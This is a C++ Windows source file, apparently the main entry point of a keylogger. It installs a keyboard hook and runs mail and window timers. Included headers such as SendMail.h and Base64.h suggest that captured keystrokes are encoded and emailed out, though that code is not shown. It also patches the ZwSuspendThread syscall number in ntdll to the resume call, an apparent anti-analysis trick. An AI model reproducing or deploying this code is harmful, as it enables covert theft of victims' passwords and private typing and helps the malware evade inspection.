#include<iostream>
#include<Windows.h>
#include<functional>
#include<stdio.h>
#include<thread>
#include"Helper.h"
#include"KeyConstant.h"
#include"Base64.h"
#include"IO.h"
#include"Timer.h"
#include"SendMail.h"
#include"KeyBoardHook.h"
#include<ShellScalingApi.h>
using namespace std;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow){

	ShowWindow(GetConsoleWindow(),SW_SHOW);

	FARPROC ZwR =
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwResumeThread");
	FARPROC ZwS =
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSuspendThread");
	DWORD sys_res, sys_sus;
	memcpy(&sys_res, (char*)((char*)ZwR + 1), 4);
	//Get the syscall number of ZwResumeThread 
	memcpy(&sys_sus, (char*)((char*)ZwS + 1), 4);
	//Get the syscall number of ZwSuspendThread 
	DWORD old;
	VirtualProtect(ZwS, 5, PAGE_EXECUTE_READWRITE, &old);
	//Set the writing permission for ZwSuspendThread 
	memcpy(((char*)ZwS + 1), &sys_res, 4);
	//change the syscall number of ZwSuspendThread to ZwResumeThread 
	SuspendThread(GetCurrentThread());
	memcpy(((char*)ZwS + 1), &sys_sus, 4); //Restore the syscall number
	VirtualProtect(ZwS, 5, old, NULL);

		InstallHook();
		MSG message;
		while (GetMessage(&message, NULL, 0, 0)) {
			TranslateMessage(&message);
			DispatchMessage(&message);
		}

		MailTimer.Stop();
		WindowTimer.Stop();
	return 0;
}
